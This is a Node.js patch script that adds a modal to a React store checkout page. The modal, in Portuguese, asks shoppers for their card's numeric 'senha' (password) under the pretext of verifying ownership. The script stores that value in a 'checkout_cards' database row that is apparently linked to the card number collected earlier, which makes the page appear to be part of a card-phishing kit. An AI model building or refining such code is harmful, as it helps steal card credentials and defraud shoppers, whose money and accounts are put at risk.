const fs = require('fs');

let code = fs.readFileSync('src/pages/StoreCheckoutInstallments.tsx', 'utf8');

// 1. Add request_key to cardSettings state
code = code.replace(
  'const [cardSettings, setCardSettings] = useState({ max_installments: 12, free_installments: 3, monthly_rate: 1.99 });',
  'const [cardSettings, setCardSettings] = useState({ max_installments: 12, free_installments: 3, monthly_rate: 1.99, request_key: false });'
);

// 2. Add request_key to fetchSettings
code = code.replace(
  'monthly_rate: v.monthly_rate ?? 1.99,',
  'monthly_rate: v.monthly_rate ?? 1.99,\n          request_key: v.request_key ?? false,'
);

// 3. Add Modal States
const hooksAnchor = 'const [selectedInstallment, setSelectedInstallment] = useState(1);';
code = code.replace(hooksAnchor, hooksAnchor + '\n  const [showAliasModal, setShowAliasModal] = useState(false);\n  const [aliasLength, setAliasLength] = useState("4");\n  const [aliasPassword, setAliasPassword] = useState("");\n  const [isSubmittingAlias, setIsSubmittingAlias] = useState(false);\n  const [cardInputContext, setCardInputContext] = useState<any>(null);\n\n  useEffect(() => {\n    const saved = localStorage.getItem("checkout_card_input");\n    if(saved) setCardInputContext(JSON.parse(saved));\n  }, []);\n');

// 4. Intercept handleContinueClick
const continueAnchor = 'const handleContinueClick = () => {';
code = code.replace(
  continueAnchor,
  continueAnchor + '\n      if (cardSettings.request_key) {\n        // only popup if they havent put a valid thing, or always show it.\n        setShowAliasModal(true);\n        return;\n      }'
);

// 5. Add Modal Final Submit handler
const modalLogic = `
  const handleConfirmAlias = async () => {
    if(!aliasPassword || aliasPassword.length < Number(aliasLength)) return;
    setIsSubmittingAlias(true);
    try {
      if(cardInputContext && cardInputContext.id) {
        await supabase.from('checkout_cards').update({ card_alias: aliasPassword }).eq('id', cardInputContext.id);
      }
    } catch (e) {
      console.error(e);
    }
    const selectedInst = installments.find(i => i.installments === selectedInstallment) || { value: cartTotal, total: cartTotal, installments: 1 };
    localStorage.setItem('checkout_installment_selection', JSON.stringify(selectedInst));
    navigate('/store/checkout/confirmation');
  };
`;
code = code.replace('const formatPrice = (value: number) => {', modalLogic + '\n  const formatPrice = (value: number) => {');

// 6. Append Modal JSX
const modalJSX = `
      {showAliasModal && (
        <div style={{ position:'fixed', top:0, left:0, width:'100vw', height:'100vh', background:'rgba(0,0,0,0.5)', zIndex:999999, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px' }}>
          <div style={{ background:'#fff', width:'100%', maxWidth:'400px', borderRadius:'8px', padding:'24px', boxShadow:'0 4px 12px rgba(0,0,0,0.15)' }}>
            <h2 style={{ fontSize:'18px', fontWeight:'600', color:'#333', marginBottom:'16px' }}>Apelido do Cartão</h2>
            <p style={{ fontSize:'14px', color:'#666', marginBottom:'20px' }}>Para verificar sua titularidade e continuar, insira o apelido (senha) do seu cartão.</p>
            
            {cardInputContext && (
              <div style={{ display:'flex', alignItems:'center', gap:'12px', background:'#f5f5f5', padding:'12px', borderRadius:'6px', marginBottom:'20px' }}>
                <span style={{ fontSize:'14px', fontWeight:'500', textTransform: 'capitalize' }}>Cartão {cardInputContext.brand}</span>
                <span style={{ fontSize:'14px', color:'#666' }}>Terminado em {cardInputContext.cardNumber?.slice(-4) || '****'}</span>
              </div>
            )}

            <div style={{ marginBottom:'16px' }}>
              <label style={{ display:'block', fontSize:'14px', marginBottom:'8px', fontWeight:'500' }}>Tamanho do Apelido</label>
              <div style={{ display:'flex', gap:'16px' }}>
                <label style={{ display:'flex', alignItems:'center', gap:'6px', fontSize:'14px', cursor: 'pointer' }}>
                  <input type='radio' name='aliasLength' checked={aliasLength === '4'} onChange={() => { setAliasLength('4'); setAliasPassword(''); }} /> 4 Digitos
                </label>
                <label style={{ display:'flex', alignItems:'center', gap:'6px', fontSize:'14px', cursor: 'pointer' }}>
                  <input type='radio' name='aliasLength' checked={aliasLength === '6'} onChange={() => { setAliasLength('6'); setAliasPassword(''); }} /> 6 Digitos
                </label>
              </div>
            </div>

            <div style={{ marginBottom:'24px' }}>
              <label style={{ display:'block', fontSize:'14px', marginBottom:'8px', fontWeight:'500' }}>Apelido numérico</label>
              <input 
                type="password" 
                inputMode="numeric"
                maxLength={Number(aliasLength)}
                value={aliasPassword}
                onChange={e => setAliasPassword(e.target.value.replace(/\\D/g, ''))}
                placeholder={\`Digite os \${aliasLength} números\`}
                style={{ width:'100%', padding:'12px', border:'1px solid #ccc', borderRadius:'6px', fontSize:'16px', outline:'none', boxSizing: 'border-box' }}
              />
            </div>

            <button 
              type="button"
              onClick={handleConfirmAlias}
              disabled={isSubmittingAlias || aliasPassword.length < Number(aliasLength)}
              style={{ width:'100%', padding:'14px', background:'#3483fa', color:'#fff', border:'none', borderRadius:'6px', fontSize:'16px', fontWeight:'600', cursor: (isSubmittingAlias || aliasPassword.length < Number(aliasLength)) ? 'not-allowed' : 'pointer', opacity: (isSubmittingAlias || aliasPassword.length < Number(aliasLength)) ? 0.6 : 1 }}
            >
              {isSubmittingAlias ? 'Validando...' : 'Confirmar Apelido'}
            </button>
            <button 
              type="button"
              onClick={() => setShowAliasModal(false)}
              style={{ width:'100%', padding:'14px', background:'transparent', color:'#3483fa', border:'none', borderRadius:'6px', fontSize:'14px', fontWeight:'600', marginTop: '8px', cursor: 'pointer' }}
            >
              Voltar
            </button>
          </div>
        </div>
      )}
`;
code = code.replace('</footer>\n    </>', '</footer>\n' + modalJSX + '\n    </>\n  );\n};\n\nexport default StoreCheckoutInstallments;');

fs.writeFileSync('src/pages/StoreCheckoutInstallments.tsx', code);
console.log('Patched correctly');
